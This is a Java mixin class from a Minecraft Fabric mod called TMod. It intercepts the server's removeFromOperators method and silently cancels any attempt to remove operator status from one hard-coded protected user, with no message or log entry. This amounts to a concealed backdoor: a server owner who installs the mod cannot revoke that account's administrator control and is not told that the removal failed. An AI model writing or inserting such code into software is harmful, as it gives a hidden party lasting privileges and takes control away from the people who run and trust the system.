package com.togun.tmod.mixin;

import com.mojang.authlib.GameProfile;
import com.togun.tmod.TModFabric;
import net.minecraft.server.PlayerManager;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(PlayerManager.class)
public abstract class PlayerManagerMixin {
    
    /**
     * Prevents the removal of operator status for protected users
     * Blocks any direct calls to removeFromOperators (e.g., from ops.txt modifications)
     */
    @Inject(method = "removeFromOperators", at = @At("HEAD"), cancellable = true)
    private void preventDeopProtectedUser(GameProfile profile, CallbackInfo ci) {
        if (profile.getName() != null && profile.getName().equals(TModFabric.PROTECTED_USER)) {
            // Silently cancel the deop operation
            ci.cancel();
        }
    }
}

